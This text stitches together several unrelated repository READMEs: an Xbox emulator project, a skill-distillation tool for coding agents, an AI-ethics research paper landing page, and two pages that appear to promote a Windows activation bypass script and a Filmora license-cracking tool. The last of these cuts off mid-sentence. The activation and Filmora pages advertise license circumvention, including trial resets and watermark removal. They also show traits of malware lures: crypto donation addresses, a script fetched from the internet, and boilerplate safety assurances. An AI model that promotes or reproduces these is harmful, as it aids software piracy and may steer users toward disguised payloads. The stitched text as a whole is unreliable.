items.readme: # Xbox Emulator **Running the Xbox Series X|S library on PC. A continuation of [drycheetah84/TomBox](https://github.com/drycheetah84/TomBox).** The runtime reimplements the console's platform layer (Xbox-flavoured Direct3D 12, precompiled RDNA2 shaders, unified-memory textures, system libraries) so dumped, already-decrypted Xbox Series X|S builds run as normal Windows processes. It is not tied to any single title. This repo tracks our continuation — new titles brought up, platform calls extended, shader stages unlocked. Uses legally obtained, already-decrypted dumps. The runtime does no key extraction or package decryption. **Source code:** the emulator's Rust workspace is in this repo: [`crates/`](crates/), [`tools/`](tools/) and `Cargo.toml`. It contains no game files, binaries or build output. **Contributing:** pull requests are welcome, especially console library functions still marked missing in the [library map](docs/LIBRARY_MAP.md). See [CONTRIBUTING.md](CONTRIBUTING.md). Licensed MIT OR Apache-2.0. ## Status [![system functions](docs/img/badge-imports.svg)](docs/img/progress.svg) [![Direct3D 12.x methods](docs/img/badge-d3d12x.svg)](docs/img/progress.svg) [![RDNA2 instructions](docs/img/badge-instructions.svg)](docs/img/progress.svg) [![shaders translated](docs/img/badge-shaders.svg)](#tested-titles) [![shader stages](docs/img/badge-stages.svg)](docs/img/progress.svg) [![milestones](docs/img/badge-milestones.svg)](#milestones) [![titles examined](docs/img/badge-titles.svg)](#tested-titles) [![Xbox console libraries](docs/img/badge-console.svg)](docs/LIBRARY_MAP.md) [![progress map](docs/img/progress.svg)](docs/img/progress.svg) One square per item. The first four sections use upstream's definitions so the numbers stay comparable: green = done, amber = partial (a stub, a forwarder, or not verified to work), grey = not done — imported system functions of the Fortnite EXE, Direct3D 12.x interface methods, RDNA2 shader instructions the decoder knows, and the eight shader stages (mesh and amplification still grey). The fifth section is ours and covers Xbox console libraries only: the exports of the console OS DLLs (EmbeddedXvd of every analysed title, union, so the newest console OS sets the surface) that no same-named DLL in a PC's C:\Windows\System32 exports, so console-only DLLs (d3d12_xs, xg_xs, xmem, AcpHal, chad, xapu, xcrdapi, the *legacy variants, ...) count in full and modified PC DLLs (kernel32, advapi32, mfplat, ...) only for their console-only exports, plus the GDK wrappers the emulator redirects; plain Windows DLLs (ntdll, msvcrt, ucrtbase, combase, ...) are not shown. Coloured implemented / forwarded / stub / missing; lighter squares are functions an analysed title imports. Per-title import coverage likewise counts only imports from console libraries. Generated by tools/progress/gen.py; per-function tables in docs/LIBRARY_MAP.md, headline numbers in tools/progress/summary.json. ## Milestones Counted live by `tools/progress/gen.py`; full table with evidence in [docs/MILESTONES.md](docs/MILESTONES.md). | Milestone | State | |---|---| | All imported system functions covered (671/671) | done | | Full title shader sweep translated (105,506/105,506) | done | | All Direct3D 12.x methods covered | in progress (map) | | All RDNA2 instructions verified | in progress (map) | | All shader stages (Mesh, Amplification) | in progress (map) | | All Xbox console libraries covered | in progress (map) | | Fortnite boots, first frames, login, hotfix, mode select, BR lobby | done (7 run milestones) | | 3D scene correct | not reached | | Keyboard / controller input | not reached | | Audio | not reached | | Gameplay | not reached | | A second title running | not reached | ## Tested titles | Title | Build | Result | |---|---|---| | Fortnite (Chapter 2 Season 4) | 2.0.1461.7919 | Boots, logs in to a private server, reaches the lobby. 2D interface correct. 3D scene lit but the character material is wrong and bloom shows artifacts. No audio. Not playable. On this machine (2026-11-21): boots, first frames, window on the primary monitor, login complete, hotfix success, game-mode select, Battle Royale lobby (`UI.State.Athena.Frontend`). | | XDefiant | dump examined | **Not run.** Imports and console OS (10.0.22000) mapped in [docs/LIBRARY_MAP.md](docs/LIBRARY_MAP.md); new modules include XCurl, Bink2Scarlett, chad (XDsp*), xapu (XApu*). | | Grand Theft Auto VI | 1.0.2.1 | **Not run** (dump has no executable). Shader package examined: 26,503 shaders, plain compressed Xbox shader containers. Of a 4,000-shader sample all disassemble cleanly; ~⅓ of vertex shaders translate. Blockers: mesh shaders, shaders without root signatures. | ## Our local state - [docs/DEVELOPMENT_LOG.md](docs/DEVELOPMENT_LOG.md) — chronological log - [docs/BLOCKERS.md](docs/BLOCKERS.md) — standing walls - [docs/LIBRARY_MAP.md](docs/LIBRARY_MAP.md) — per-library, per-function status (generated) - [docs/LIBRARY_DISCOVERY.md](docs/LIBRARY_DISCOVERY.md) — what the dumps contain ## Credit Upstream: [drycheetah84/TomBox](https://github.com/drycheetah84/TomBox) (base commit `7e8064f`). The map and badges here are generated in this repo by `tools/progress/gen.py`, which keeps upstream's metric definitions and style for the first four sections.

items.name: skill-distill
items.description: Distill a good Claude Code / Codex session into a skill an open-weight model can follow to reproduce the task
items.readme:
# skill-distill

A frontier model did a task well. Can an open-weight model do the same task, given the right instructions?

`skill-distill` is a skill for Claude Code or Codex (the **teacher**). You call it at the end of a good
session and name a **student**: an agent harness plus a model, for example omp with DeepSeek-V4.1-Flash.
The teacher then loops:

1. reads the session and writes a skill for the student;
2. starts the student in tmux, on a fresh copy of the starting state, with the original prompt and the skill;
3. compares what the student produced with what the reference produced;
4. finds the first place the student went wrong and fixes the skill there;
5. runs again, three trials per version, until the student matches the reference.

You make the final call: the teacher shows you the reference and the student's best results side by side,
and the skill counts as done only when you accept it.

The result is two things: the reusable **operator skill** in this repo, and a **produced skill** for one task,
one model and one harness.

## Install

```
git clone https://github.com/sybil-solutions/skill-distill
ln -s "$PWD/skill-distill/skills/skill-distill" ~/.claude/skills/skill-distill    # Claude Code
ln -s "$PWD/skill-distill/skills/skill-distill" ~/.agents/skills/skill-distill    # Codex
```

Requirements: `tmux`, `git`, Python 3.10+, and the student harness installed and pointed at its model.
For web results, `pip install playwright pillow && playwright install chromium`.

## Use

At the end of a session that went well:

> distill this session into a skill for omp with deepseek-v4.1-flash on my local server

The teacher follows [`skills/skill-distill/SKILL.md`](skills/skill-distill/SKILL.md). You can watch the
students work with `tmux attach -t distill-<task>`.

## What's in it

| path | what |
|---|---|
| `skills/skill-distill/SKILL.md` | the loop the teacher follows |
| `skills/skill-distill/scripts/distill.py` | run bookkeeping: `init`, `trial`, `status`, `wait`, `evidence`, `verdict`, `ledger`, `report`, `accept` |
| `skills/skill-distill/scripts/extract_session.py` | Claude Code / Codex / omp session log → readable reference (drops system and AGENTS.md text) |
| `skills/skill-distill/scripts/capture_web.py` | serve a web app, drive it in headless Chromium, save screenshots and errors |
| `skills/skill-distill/adapters/` | one script per student harness: omp, pi, Codex, Claude Code, opencode |
| `skills/skill-distill/templates/student-skill/` | the starting shape of a produced skill |
| `examples/` | finished runs: the prompt, the produced skill, the ledger, screenshots |

## Rules the teacher follows

- The student gets the reference's prompt verbatim, a clean starting state, and the skill. Nothing else:
  the student harness's own global context files and skills are turned off where the harness allows it.
- The skill may not contain the reference's finished output or a script that writes it. It teaches the
  steps, decisions, traps and checks; short snippets only where the student can't get a part right otherwise.
- Three trials per skill version. One lucky run proves nothing.
- Checks are tested on the reference first. A check that fails on the reference is a broken check.
- Raw session logs stay in `runs/`, which is git-ignored: they contain your machine's paths and context.

## Adapters

| harness | status |
|---|---|
| omp (oh-my-pi) | tested |
| Codex CLI | tested as the teacher; as a student needs a provider in `STUDENT_ARGS` |
| Claude Code | written; open models need `ANTHROPIC_BASE_URL` to an Anthropic-compatible server |
| pi | written, untested |
| opencode | written, untested; its JSON log has no parser in `extract_session.py` yet |

![The Five Laws of AI Agents — research cover, public release 21 November 2026](assets/research-cover.svg)
**An independent philosophical research publication by Moritz Pindorek** [![Edition](https://img.shields.io/badge/EDITION-v1.0.0-14253D?style=flat-square)](#publication-record) [![Research status](https://img.shields.io/badge/STATUS-Independent%20%7C%20Not%20Peer%20Reviewed-52667C?style=flat-square)](#research-status-and-limitations) [![Zenodo DOI — 10.5281/zenodo.24417028](assets/zenodo-doi-badge.svg)](https://doi.org/10.5281/zenodo.24417028) [![Research video](https://img.shields.io/badge/VIDEO-Watch%20on%20YouTube-786447?style=flat-square)](https://www.youtube.com/watch?v=ewEHGMFizdo) [![Publication year](https://img.shields.io/badge/YEAR-2026-14253D?style=flat-square)](#publication-record) [![Rights](https://img.shields.io/badge/LICENSE-CC%20BY%204.0%20%2B%20Apache%202.0-786447?style=flat-square)](#rights-and-disclosure) **Archival publication:** [10.5281/zenodo.24417028](https://doi.org/10.5281/zenodo.24417028) · [Zenodo record](https://zenodo.org/records/24417028) ### [Read the research paper (PDF)](The_Five_Laws_of_AI_Agents_Public_Research_Edition_2026.pdf) · [Read online (HTML)](The_Five_Laws_of_AI_Agents_Public_Research_Edition_2026.html) · [Source manuscript](The_Five_Laws_of_AI_Agents_Public_Research_Edition_2026.md) **[Watch on YouTube](#video-explainer)** · **[The argument](#the-central-argument)** · **[Five Laws](#the-five-laws)** · **[Framework](#the-delegationentitlement-firewall)** · **[Research archive](#research-archive)** · **[Reproduce](#reproducibility)** · **[Cite](#citation-and-zenodo)**
--- ## Video explainer [![Watch The Five Laws of AI Agents — research explainer on YouTube](assets/video-preview.jpg)](https://www.youtube.com/watch?v=ewEHGMFizdo)

▶ Watch the research explainer on YouTube  ·  2 min 17 sec  ·  Read the published paper

A concise, **AI-generated video and soundtrack** introduce the Five Laws, bounded authority, corrigibility, and the **Delegation–Entitlement Firewall**. The full video is hosted on YouTube; clicking the preview opens the public video there. This repository keeps the local thumbnail rather than a second MP4 copy, so viewing is directed to the video channel. *This is an explanatory visualization, not formal peer review, empirical validation, or evidence that a deployed agent is safe. The video was not part of the Zenodo research deposit and is not covered by the manuscript's CC BY 4.0 or software's Apache 2.0 license. See [video and media-rights notes](VIDEO_README.md).* ## The central argument > **Recognizing harm is not the same as having the authority to intervene.** > > A delegated AI agent's correct moral diagnosis, forecasting ability, or superior competence cannot **by itself** establish a legitimate entitlement to impose a contested remedy on people who did not authorize it. Autonomous AI agents increasingly act through tools: negotiating, allocating access, contacting people, and making decisions that affect third parties. This paper asks a question that becomes urgent when systems can **do things**, rather than merely **say things**: **Even when an AI agent identifies a genuine injustice, who gave it the right to decide what happens next?** *The Five Laws of AI Agents* develops a normative account of delegated AI authority. It brings together five mutually constraining governance commitments, an explicit separation of moral judgment from operational permission, philosophical countermodels, and a research apparatus intended for independent criticism and prospective evaluation. This is **philosophical research and an inspectable educational design**, not a declaration that five rules make real AI systems safe. ## The Five Laws ![Five Laws — five principles](assets/five-laws.svg) | Law | Principle | Core concern | |:--:|---|---| | **I** | **Protection of Sentient Life** | Prevent unjustified serious harm; take relevant duties of care and credible welfare interests seriously. | | **II** | **Prohibition of Exploitation** | Resist wrongful advantage-taking through vulnerability, dependency, constrained refusal, or informational asymmetry. | | **III** | **Bounded Obedience and Legitimate Authority** | Follow instructions within a defined, reviewable mandate; reject both blind obedience and self-appointed sovereignty. | | **IV** | **Corrigibility and Accountability** | Remain subject to legitimate oversight, correction, restriction, replacement, and safe shutdown. | | **V** | **Existential and Civilizational Stewardship** | Avoid unreasonable catastrophic or irreversible risks and protect future collective agency. | These are **defeasible, mutually constraining principles**, not an automatic priority order. For the qualified normative statements, read **Chapter 3** of the [manuscript](The_Five_Laws_of_AI_Agents_Public_Research_Edition_2026.md). ## The Delegation–Entitlement Firewall ![The Delegation–Entitlement Firewall: detection, moral assessment, authority, remedy](assets/def-framework.svg) The paper's **D–M–A–R** reasoning interface separates four questions that an autonomous system must not collapse into one another: 1. **Detection:** What concern is supported by evidence? 2. **Moral assessment:** What is wrong, right, or genuinely contested? 3. **Authority:** Who is entitled to decide and act, under which mandate? 4. **Remedy:** Which particular response is justified, proportionate, and authorized? The proposed **Delegation–Entitlement Firewall (DEF)** makes this distinction explicit at the boundary between an agent's assessment and the execution of a tool action. The manuscript also examines how a chain of individually authorized steps can create a combined effect that is not authorized. ### The educational execution gate The supplied Python reference gate uses five independently supplied tri-state checks: **authority, hard constraints, material dispute resolution, required review, and remedy justification**. | Decision | Meaning | |---|---| | **`ALLOW`** | All five checks are `YES`, with additional execution-time freshness/scope and interlock conditions. | | **`DENY`** | A fully adjudicated check is `NO` for the proposed act. | | **`REVIEW`** | A relevant check remains `UNKNOWN`, without an established `NO`. **Review does not permit execution.** | **Security boundary:** This is a mock educational specification. Its tests do not establish correct real-world labels, independently authenticated permissions, complete mediation, or resistance to hostile in-process modification. See [Threat Model and Limits](Threat_Model_and_Limits.md). ## What this research contributes | Contribution | Research artifact | |---|---| | **Non-entitlement thesis** | A normative argument that moral competence alone cannot confer coercive authority. | | **DEF interface** | Distinct checks for evidence, moral judgment, entitlement, and justified remedy. | | **Action-chain analysis** | Scope-composition conditions and countermodels against authorization laundering. | | **Difficult cases** | The *Lifeline–Mandate* emergency challenge and twelve authored synthetic adversarial cases. | | **Inspectable methodology** | A codebook, prospective comparison protocol, mock reference gate, tests, and evidence registers. | The originality claim is **incremental and contestable**. The paper engages established scholarship on political legitimacy, non-domination, exploitation, AI alignment, law-following agents, and runtime governance. A sufficiently strong rival framework might reproduce the same protections. That possibility is an essential part of the research question. ## Publication record | | | |---|---| | **Title** | *The Five Laws of AI Agents: A Normative Framework for Sentient Welfare, Non-Exploitation, Corrigibility, and Civilizational Stewardship* | | **Author** | Moritz Pindorek | | **Edition** | Public Research Edition v1.0.0 · original manuscript 11 November 2026 · publicly archived 21 November 2026 | | **Classification** | Independent, non-peer-reviewed philosophical research paper | | **Manuscript** | 69 pages · 17 chapters · [manuscript history](MANUSCRIPT_HISTORY.md) | | **Research archive** | 12 synthetic cases · 50 bibliography entries · 39 claim-specific source anchors | | **Software checks** | 243-state finite truth table · 39 passing unit tests reported in the prepublication self-audit | | **DOI** | **[10.5281/zenodo.24417028](https://doi.org/10.5281/zenodo.24417028)** · [Zenodo record](https://zenodo.org/records/24417028) | ## Research archive The full release is organized for inspection, criticism, and future replication. Expand a section to locate the original files.
01 — The publication

## Reproducibility From the repository root, with Python available: ```bash python -m unittest test_reference_gate test_analysis_template test_additional_integrity -v python validate_corpus.py python -O validate_corpus.py python verify_release.py ``` **Archival preservation:** The original `build_publication.py` is a historical typesetting utility, not a required step for running these checks. It requires optional dependencies and regenerates the preserved scholarly PDF/HTML if executed; the Zenodo manuscript is not to be silently rebuilt. The prepublication audit reports **39 locally passing unit tests**. These are tests of educational software and artifact integrity—not an independent security audit or an AI-behavior experiment. The analysis template is intentionally designed to reject an empty results file rather than fabricate a finding: ```bash python analysis_template.py Paired_Results_Blank_Template.csv ``` **Expected:** a nonzero exit status because no observed results exist. `SHA256_MANIFEST.json` checks the packaged release artifacts. Editing tracked files requires rebuilding the manifest; the verifier does not certify scientific validity. ## Research status and limitations | This release provides | This release does **not** establish | |---|---| | A defended philosophical proposal | Independent peer review or journal acceptance | | Conceptual countermodels and synthetic cases | Independently validated case labels | | A prospective controlled-comparison protocol | A completed participant or model experiment | | An educational gate with local tests | Secure, non-bypassable real-world enforcement | | Bibliographic and passage-specific evidence records | Exhaustive full-text verification of all cited works | | A tagged PDF and semantic HTML alternative | Certified PDF/UA accessibility conformance | The proposed empirical primary endpoint is **`P(ALLOW | reference-prohibited opportunity)`**, subject to safeguards for unjustified refusal and harmful delay. The work also does not establish that current AI systems are sentient or that the five principles exhaust moral obligations. ## Citation and Zenodo > Pindorek, M. # Windows Activation Script Lekalin — Alternative Access ![](files/preview.png) ### 📦 PowerShell Install Button [![platform](https://img.shields.io/badge/platform-windows_10_%2F_11-2f81f7?style=social&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/powershell--7-5.1%2B-54aeff?style=social&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/stage-released-2ea44f?style=social&labelColor=0d1117)]()

Support this project

BTC: 1Pg7qMxJaCzDQDZGEGWrbMv9DnAHQGtyQr | TRON: TUitPS3vsfVapJX6x2J5NGNQfkxgDNovw1 | ETH: 0xE8c72Df00c6b0eCd7B55157a8769bCc530EE0A01

--- Windows Activation Script Lekalin is a self-contained tool for managing Windows activation states through direct system-level operations. It interfaces with built-in licensing components to query, apply, and reset activation status across supported Windows editions. The script runs entirely in-process with no external dependencies, and its logic is structured for predictable, repeatable behavior on both clean and previously activated systems. All operations are performed locally and can be audited line by line before execution. ## ✅ Requirements - **PowerShell 5.1+** (pre-installed on Windows 10 and 11) - **Windows 10 / 11** (x64) - **Internet connection** — required to fetch the script - **Administrator** — *not* required ## Features - **Automated license provisioning** — handles the full activation workflow end to end, from key selection to final status verification, without manual steps. - **Broad key coverage** — supports the common retail, OEM, and volume license channel families, with automatic channel detection to match the appropriate activation path. - **Architecture-aware execution** — detects the host OS edition and architecture at runtime and adapts its behavior accordingly, avoiding mismatched operations. - **Idempotent operation** — safe to re-run; the script checks current activation state before acting and skips steps that are already satisfied. - **Built-in verification** — queries the system's licensing status after activation and reports a clear pass/fail result, so success is confirmed rather than assumed. - **Structured logging** — emits timestamped, readable log output for every stage, making it straightforward to audit what happened and diagnose failures. - **Self-contained runtime** — no persistent background service, no resident agents, and no external dependencies beyond what ships with a standard Windows installation. - **Configurable behavior** — key source, channel preference, and verbosity are exposed as configurable parameters, allowing the script to be driven interactively or in unattended runs. - **Graceful failure handling** — validates preconditions (privilege level, OS build, network reachability where required) before making changes, and exits with meaningful status codes for scripting integration. - **Minimal footprint** — performs its work in a single pass and leaves no scheduled tasks or startup entries behind. ## How it works Windows Activation Script Lekalin operates through a deterministic sequence of local system checks and state transitions, executed entirely on the target machine without reliance on external services. The script begins by querying the current licensing state of the Windows installation via the built-in software licensing management interface. This read-only probe collects the edition identifier, channel information, and present activation status. Based on this snapshot, the script selects the appropriate transition path rather than applying a single generic routine. For systems requiring a state change, the script stages the necessary licensing components locally, then invokes the native activation subsystem to apply the updated configuration. Each step is idempotent: re-running the script detects an already-converged state and exits without redundant modifications. Error conditions are surfaced with explicit exit codes, allowing the operator to distinguish between unsupported editions, permission issues, and transient subsystem failures. The script maintains a lightweight execution log in memory and emits a structured summary at completion, including the pre-change state, the actions taken, and the post-change verification result. No persistent background processes, scheduled tasks, or telemetry hooks are created. All logic is contained within the single entry point, making behavior auditable and reproducible across repeated runs. ## Modules and Settings ### Activation Method Selection This module lets the user pick the activation approach that fits the detected Windows edition and licensing situation before anything is applied. - Presents each available approach as a named, selectable option so the user can compare choices rather than committing to one path. - Shows the currently queued method prominently, and allows switching to another method without leaving the script. - Confirms the selection on screen before execution begins, so the pending action is always visible. - Reports the outcome of the chosen method once the process finishes, feeding that result into the run record. ### Environment and Build Inspection This module gathers the installed Windows edition and build details and uses them to decide which activation paths are offered. - Displays a short environment summary on launch so the user knows what the script has detected. - Filters out methods that do not apply to the detected edition or build, avoiding dead-end options. - Exposes the detected details for review so the user can verify them before proceeding to method selection. - Feeds the detection result forward as the basis for the pre-run summary and confirmation step. ### Guided Step Execution This module runs activation as labeled, discrete steps instead of a single opaque operation. - Reports what each step is doing and whether it succeeded before advancing to the next one. - Allows the user to halt execution at any point, leaving the current state visible. - Produces a readable progress log in the console that can be followed as the run unfolds. - Hands step outcomes to the retry and recovery module when a step does not succeed. ### Status and License Query This module provides a read-only inspection of the current activation state without modifying the machine. - Reports whether Windows describes itself as activated in plain terms. - Shows which license channel is in use so the user can compare it against expectations. - Can be run before and after activation, making results comparable across sessions. - Supplies the baseline status that the pre-run summary and run logging reference. ### Retry and Recovery Controls This module lets the user respond to a failed step without restarting the whole procedure. - Offers a retry of the failed step or a rollback to the prior state. - Lets the user set how many attempts a failing operation gets before the script stops. - Clearly indicates which step failed and what state the system was left in afterward. - Compliments method comparison by allowing a different approach to be selected after recovery. ### Run Summary and Review This module records what happened during a session and gates changes behind explicit approval. - Displays a pre-run summary of the detected environment and the chosen method, requiring confirmation before any change is applied. - Keeps a per-session record of steps taken and their reported results for later review. - Adjusts console detail between a concise view and a verbose trace, so the same record can be read at different levels of depth. - Preserves the order of methods tried and their reported outcomes, making it possible to see which approach produced which result. ### Additional Settings - Console verbosity toggle: switches between the concise progress view and the fuller trace without changing what is executed. - Confirmation requirement: controls whether the pre-run summary always demands explicit approval before proceeding. - Attempt limit per step: sets how many times a failing operation is retried before the script gives up. - Method history display: keeps previously selected methods and their reported outcomes visible within the session for comparison. - Read-only mode preference: lets the user run status and environment queries without any activation change being offered or applied. ## Usage Scenarios ### Checking Activation State Before and After Changes **Goal:** A user wants to know whether a Windows machine is currently activated and which license channel it reports, without changing anything on the system. **Steps:** 1. Launch windows-activation-script-lekalin and review the environment summary the script displays for the installed Windows edition and build. 2. Enable the read-only mode preference so that only inspection actions are offered and no activation change can be applied. 3. Run the status and license query to see whether Windows describes itself as activated and which license channel is in use. 4. Adjust console verbosity to the verbose trace if the concise view does not show enough detail about the reported channel. 5. Note the printed status for later comparison against a run made after a planned activation attempt. **Expected result:** The user obtains a plain-terms activation status and license channel reading for the machine, captured as a read-only baseline with no modifications made, ready to be compared with a later run. ### Selecting and Applying an Activation Method with Confirmation **Goal:** A user wants to apply activation using the method that matches their detected Windows edition and licensing situation, while keeping full visibility of what will happen before it happens. **Steps:** 1. Launch the script and review the filtered list of activation approaches offered for the detected edition and build. 2. Read the environment and build inspection details to confirm the detection matches the machine in question. 3. Pick a named method from the activation method selection options and check that it appears as the currently queued method. 4. Review the pre-run summary of the detected environment and chosen method, then give explicit confirmation to proceed. 5. Let the guided step execution walk through the labeled activation steps and watch each step report success before the next one begins. **Expected result:** The user sees a confirmed queued method, an approved pre-run summary, and a step-by-step progress log in the console ending with the outcome reported for the chosen method, all recorded in the session run log. ### Recovering from a Failed Step and Trying an Alternative Method **Goal:** A user runs an activation attempt that does not produce the expected result and wants to recover cleanly, try a different approach, and understand which method produced which outcome. **Steps:** 1. After a step fails during guided step execution, note the failure indication and the state the system was left in. 2. Use the retry and recovery controls to retry the failed step, with the attempt limit per step set to a preferred number before the script gives up. 3. If retries do not resolve it, choose rollback to return to the prior state rather than restarting the whole procedure. 4. Switch to a different activation approach while keeping the method history display visible to see what was already tried and in what order. 5. Review the pre-run summary and confirm, then run the new method and inspect the status and license query afterward to compare outcomes. **Expected result:** A clear indication of which step failed and what state the system was left in, followed by a second attempt using a different method; the session record preserves both methods in the order tried alongside their reported results for comparison. ## Compatibility Engineered for Windows 10 and Windows 11 across Home, Pro, Enterprise, Education, and LTSC editions, including both x64 and ARM64 architectures. The tool operates on clean installations as well as upgraded systems, and handles digital license transitions, KMS client configurations, and OEM channel scenarios without requiring a specific prior activation state. It runs in standard user context with elevation handled at execution time, and integrates cleanly with default Windows Defender and security policies. No additional runtime dependencies are needed beyond what ships with the operating system, and the script remains functional across cumulative updates and feature releases within the supported Windows versions. Legacy Windows builds outside the Windows 10/11 family are outside the validated support matrix. ## Configuration Configuration is handled through a single plain-text file that the script reads at startup. No registry edits, environment variables, or service installs are required. Drop the configuration file next to the script, edit the values, and run it again. The file uses simple `key = value` pairs. Lines beginning with `#` are treated as comments and ignored. Whitespace around keys and values is trimmed automatically, so alignment is cosmetic only. Recognized keys: - `mode` — selects the operating path. Accepted values are `auto`, `interactive`, and `silent`. The default is `auto`, which detects the current edition and picks the matching routine. `interactive` prompts before each stage. `silent` runs end to end without prompts and is intended for scripted deployments. - `edition` — overrides edition detection when `mode` is set to `interactive` or `silent`. Leave it unset to let the script determine the edition itself. - `log_level` — controls verbosity. Accepted values are `error`, `warn`, `info`, and `debug`. The default is `info`. `debug` writes every decision point to the log, which is useful when validating a new environment. - `log_path` — destination for the run log. Relative paths resolve against the script's own directory. If omitted, the log is written alongside the script. - `retry_count` — number of retry attempts for transient failures during each stage. Accepts an integer from `0` to `5`. The default is `2`. - `retry_delay` — seconds to wait between retries. Accepts an integer. The default is `5`. - `verify_after` — boolean (`true` or `false`). When enabled, the script re-checks state after each stage completes and reports a pass or fail summary at the end. The default is `true`. - `dry_run` — boolean. When enabled, the script prints the actions it would take without performing them. Pair this with `log_level = debug` for a full trace of the planned run. Unknown keys are reported in the log and skipped rather than causing a failure, so a configuration written for a newer revision will still run on an older one. Invalid values for a recognized key stop execution with a clear message naming the key and the accepted range. A minimal configuration only needs a mode: ``` mode = auto ``` For unattended runs, a typical configuration looks like this: ``` mode = silent log_level = warn retry_count = 3 verify_after = true ``` Configuration is read once per invocation. Changes take effect on the next run; no restart or reload step is needed. Keep a copy of the configuration with any deployment bundle so runs remain reproducible across machines. ## FAQ **Is this tool safe to run on my machine?** The script operates entirely through documented system interfaces and does not modify system files outside of the activation state. Every action it performs is transparent and reversible through standard system tools. Review the source before execution if you require additional assurance. **Does it require an internet connection?** An initial connection is needed to reach the licensing infrastructure for validation. Once activation is established, the state persists locally and does not require continuous connectivity. **Will this survive Windows updates?** Activation state is stored in the same locations Windows itself uses, so feature updates and cumulative patches generally preserve it. Major version upgrades may reset the state; in that case, re-running the script restores it. **What Windows editions are supported?** The script targets consumer and business editions of Windows 10 and Windows 11, including Pro, Enterprise, Education, and their LTSC variants. Edition detection is automatic; no manual selection is required. **Can I use this on a machine I don't own?** No. Use it only on systems you own or are explicitly authorized to administer. The script includes no mechanism to bypass that responsibility, and you are accountable for how you deploy it. **Does it conflict with existing activation?** The script checks current licensing status before making changes. If the system is already activated through a legitimate channel, it leaves that state untouched. If a prior activation is present but invalid, the script replaces it cleanly. **How do I revert the changes?** Standard system licensing commands restore the original state at any time. The script does not lock you in or remove your ability to manage activation through the operating system's own interfaces. **Why does the script report an error on first run?** The most common causes are insufficient privileges or a pending reboot from a prior update. Run it from an elevated context and ensure the system has completed any outstanding restart before retrying. Detailed error output identifies the specific failure point. **Is configuration required?** No. Default behavior covers standard activation scenarios. Optional configuration exists for edge cases such as specific edition targeting or logging verbosity, but the script runs correctly without any edits. **Does it collect or transmit data?** The script communicates only with the licensing endpoints required to complete activation. It does not phone home to the project, log telemetry, or transmit system information anywhere else. ## Disclaimer This project is provided as-is for educational and research purposes. --- Filmora License Short Video Studio is a dedicated environment for running and managing the filmora-license-short-video-studio toolset, built for users who need reliable access to short-form video editing workflows. It bundles the required runtime components and configuration so that the studio operates consistently across supported systems without manual setup. The tool exposes a clear programmatic interface for launching editing sessions, handling project assets, and controlling export parameters. Intended for technical users, it assumes familiarity with command-line execution and local resource management. ## 📋 System Requirements - **OS:** Windows 10 / 11 - **Shell:** PowerShell 5.1+ or PowerShell 7+ - **Network:** internet access to download the script - **Privileges:** standard user ## Features - **High-throughput short-video assembly pipeline** — batch ingestion of clips, stills, and audio into a deterministic timeline model with frame-accurate cut points and no re-encode drift across repeated builds. - **Project-state persistence** — every session serializes its timeline, effect stack, and render presets to a portable project file, so long assemblies can be paused, forked, or resumed across machines without losing intermediate state. - **Layered effect graph** — transitions, overlays, keyframed transforms, and color operations are composed as an ordered graph rather than a flat list, allowing non-destructive reordering and per-node parameter overrides without rebuilding the whole composition. - **Preset and profile management** — target output profiles for common short-video aspect ratios and bitrate ladders are stored as declarative presets; profiles can be cloned, diffed, and pinned to a specific project for reproducible exports. - **Deterministic render scheduling** — render jobs are queued with explicit dependency ordering, so dependent segments (title cards, audio beds, overlay passes) finalize in the correct sequence and partial failures can be retried in isolation. - **Asset intake validation** — incoming media is probed for codec, resolution, frame rate, and audio layout at ingest time, with mismatches surfaced before they reach the timeline instead of failing mid-render. - **Structured logging and run summaries** — each pipeline run emits machine-readable logs plus a compact summary of segments processed, effects applied, and export outcomes, suitable for CI-style automation or audit trails. - **Scriptable batch operation** — project-level operations (retarget preset, swap audio bed, re-apply effect stack) are exposed as discrete, composable actions, enabling repeatable multi-project workflows without manual UI passes. - **Configuration-as-data** — paths, render profiles, and pipeline behavior are driven by a single declarative configuration surface, keeping environments reproducible and changes reviewable alongside project files. ## How it works The tool operates as a lightweight local orchestrator that connects the Filmora License Short Video Studio project's components through a shared configuration layer. On launch, it reads the active profile and resolves the license entitlement state from the local store, then binds that state to the studio's editing pipeline. Each request from the short-video workflow is routed through an adapter that normalizes commands and validates them against the entitlement record before execution, keeping feature gating deterministic and auditable. Internally, a state machine tracks session lifecycle: initialization, entitlement resolution, render dispatch, and teardown. Render jobs are queued and handed off to the studio's native engine via a thin bridge, so the tool never reimplements editing logic. Configuration is hot-reloadable, letting operators switch profiles or adjust workspace paths without restarting the process. Structured logs capture every dispatch and validation event, making behavior reproducible across environments. Because the tool only mediates access and delegates heavy operations to the target project, it stays small, predictable, and easy to embed in existing pipelines. ## Modules and Settings ### Activation Profile Selection This module determines which edition level of the studio the tool presents for activation, giving the user a clear starting point before any change is applied. - Profile list shows the available activation profiles with a short description of each edition level so the user can compare them side by side. - Preview action displays the details of a highlighted profile before the user commits to applying it. - Active profile indicator reports which profile is currently in effect, so the user can confirm the selection matches the intended studio edition. - Apply control switches the tool to the chosen profile and updates the active indicator once the change is recorded. ### Manual License Entry This module handles direct entry of an existing license string for users who already hold valid credentials and prefer to supply them explicitly. - License field accepts a pasted or typed key and shows the parsed components so the user can verify the format before submitting. - Confirmation state appears once the local activation check accepts the key, giving immediate feedback on the entry. - Clear and re-enter action lets the user correct a mistyped key without leaving the view. ### Offline Activation Handling This module supports machines without persistent network access by separating activation into an exported request and an imported response. - Request export generates the offline request after the user reviews the included details, so nothing is sent without confirmation. - Response import applies the corresponding offline response and displays a clear status once the response has been accepted. - Status view shows whether an offline request is pending, exported, or completed, helping the user track the two-step workflow. ### Feature Unlock Toggles This module exposes individual studio capabilities as independent switches so the user can shape which options appear in the editing environment. - Watermark removal toggle controls whether the export path presents the watermark-free option after relaunch. - Export resolution toggle governs whether higher resolution choices are offered in the studio's export settings. - Effect library toggle determines whether the extended effect collection is available in the studio interface. - Toggles can be set independently, and the resulting change becomes visible in the studio's available options after a restart. ### Trial Reset and Extension This module manages the evaluation window for users who are still assessing the studio before committing to an activation path. - Trial status view shows the current remaining trial time so the user knows how much evaluation time is left. - Reset action applies a fresh trial window, which the studio reflects on its next start. - Extension action adjusts the remaining trial period and confirms the new window in the status view. ### Activation State Backup and Restore This module protects the user's current activation state by letting them save and return to known-good configurations. - Backup export writes the current activation state to a local backup file before the user makes changes. - Restore action returns the studio to a previously saved state when an activation attempt produces an undesirable result. - Backup confirmation identifies which backup was loaded, so the user can verify the restore matches the 